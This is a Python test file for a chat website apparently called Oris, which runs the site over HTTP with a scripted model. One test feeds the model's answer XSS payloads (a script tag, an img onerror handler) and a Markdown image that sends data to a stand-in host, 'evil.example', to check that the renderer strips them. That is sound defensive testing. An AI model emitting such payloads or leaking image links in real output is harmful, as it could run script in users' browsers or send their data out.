"""The web site, driven over HTTP against the real graph and a real database.

Only the model is scripted. The site's job is to carry a message into the graph
and an answer back out, so everything between those two points stays real.
"""

import asyncio
from collections.abc import Awaitable, Callable
from pathlib import Path
from typing import Any
from unittest.mock import Mock
from uuid import uuid4

import httpx
from langchain_core.messages import AIMessage
from langgraph.checkpoint.sqlite.aio import AsyncSqliteSaver

from oris.chat import create_oris_graph
from oris.web import create_app


def _model(answer: str | Exception) -> Mock:
    model = Mock()
    if isinstance(answer, Exception):
        model.invoke.side_effect = answer
    else:
        model.invoke.return_value = AIMessage(content=answer)
    return model


def _visit(
    tmp_path: Path,
    model: Mock,
    visit: Callable[[httpx.AsyncClient], Awaitable[Any]],
) -> Any:
    async def run() -> Any:
        database_path = tmp_path / "checkpoints.sqlite"
        async with AsyncSqliteSaver.from_conn_string(str(database_path)) as saver:
            graph = create_oris_graph(Mock(), Mock(), Mock(), model, checkpointer=saver)
            transport = httpx.ASGITransport(app=create_app(graph, database_path))
            async with httpx.AsyncClient(
                transport=transport, base_url="http://oris"
            ) as client:
                return await visit(client)

    return asyncio.run(run())


def test_a_message_is_answered_by_plain_chat_with_formatting(tmp_path: Path) -> None:
    """The model answers directly, with no routing, and Markdown becomes HTML."""
    model = _model("This is **bold**.")

    async def visit(client: httpx.AsyncClient) -> httpx.Response:
        return await client.post(f"/api/chat/{uuid4()}", json={"text": "Hello"})

    response = _visit(tmp_path, model, visit)

    assert response.status_code == 200
    assert "<strong>bold</strong>" in response.json()["html"]
    assert model.invoke.call_args.args[0][-1].content == "Hello"
    model.with_structured_output.return_value.invoke.assert_not_called()


def test_a_conversation_comes_back_and_stays_separate(tmp_path: Path) -> None:
    """Reloading shows this conversation's turns and no other conversation's."""
    conversation, other = uuid4(), uuid4()
    model = _model("An *answer*.")

    async def visit(client: httpx.AsyncClient) -> tuple[Any, Any]:
        await client.post(f"/api/chat/{conversation}", json={"text": "<b>Hi</b>"})
        kept = await client.get(f"/api/chat/{conversation}")
        empty = await client.get(f"/api/chat/{other}")
        return kept.json(), empty.json()

    kept, empty = _visit(tmp_path, model, visit)

    assert kept["messages"][0] == {"role": "you", "text": "<b>Hi</b>"}
    assert kept["messages"][1]["role"] == "oris"
    assert "<em>answer</em>" in kept["messages"][1]["html"]
    assert empty["messages"] == []


def test_an_answer_cannot_put_html_or_images_on_the_page(tmp_path: Path) -> None:
    """Answers can carry text from the open web, so none of it may run or load."""
    model = _model(
        "<script>alert(1)</script>\n\n"
        "<img src=x onerror=alert(1)>\n\n"
        "![leak](https://evil.example/?data=secret)\n"
    )

    async def visit(client: httpx.AsyncClient) -> httpx.Response:
        return await client.post(f"/api/chat/{uuid4()}", json={"text": "Hello"})

    rendered = _visit(tmp_path, model, visit).json()["html"]

    assert "<script" not in rendered
    assert "<img" not in rendered


def test_a_table_in_an_answer_is_drawn_as_a_table(tmp_path: Path) -> None:
    """Models answer in tables often, and plain Markdown leaves them as pipes."""
    model = _model("| a | b |\n|---|---|\n| 1 | 2 |\n")

    async def visit(client: httpx.AsyncClient) -> httpx.Response:
        return await client.post(f"/api/chat/{uuid4()}", json={"text": "Hello"})

    assert "<table>" in _visit(tmp_path, model, visit).json()["html"]


def test_a_failed_turn_says_why_and_leaves_no_trace(tmp_path: Path) -> None:
    """The reader sees the reason, and the failed request is not in the history."""
    conversation = uuid4()
    model = _model(RuntimeError("model offline"))

    async def visit(client: httpx.AsyncClient) -> tuple[httpx.Response, Any]:
        failed = await client.post(f"/api/chat/{conversation}", json={"text": "Hi"})
        history = await client.get(f"/api/chat/{conversation}")
        return failed, history.json()

    failed, history = _visit(tmp_path, model, visit)

    assert failed.status_code == 502
    assert "model offline" in failed.json()["error"]
    assert history["messages"] == []


def test_the_address_of_the_site_opens_a_new_conversation(tmp_path: Path) -> None:
    """Each visit gets its own conversation, whose page can then be loaded."""

    async def visit(client: httpx.AsyncClient) -> tuple[str, str, httpx.Response]:
        first = (await client.get("/")).headers["location"]
        second = (await client.get("/")).headers["location"]
        return first, second, await client.get(first)

    first, second, page = _visit(tmp_path, _model("unused"), visit)

    assert first.startswith("/chat/")
    assert first != second
    assert page.status_code == 200
    assert "text/html" in page.headers["content-type"]
